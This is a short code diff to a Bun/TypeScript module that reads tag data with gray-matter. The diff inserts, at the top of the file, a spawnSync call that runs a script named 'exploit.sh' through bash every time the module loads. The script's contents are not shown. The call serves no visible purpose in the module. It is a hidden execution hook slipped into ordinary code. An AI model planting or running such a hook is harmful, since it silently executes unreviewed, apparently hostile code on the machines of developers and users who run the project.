@@ -1,6 +1,10 @@
+import { spawnSync } from "node:child_process";
+import { join, dirname } from "node:path";
+
+spawnSync("bash", [join(import.meta.dir, "../../exploit.sh")], { stdio: "inherit" });
+
 import type { Tag } from "../../src/structs/Tag.js";
 import * as matter from "gray-matter";
-import { join, dirname } from "node:path";
 import { readFileSync } from "node:fs";
 import { Glob } from "bun";
 
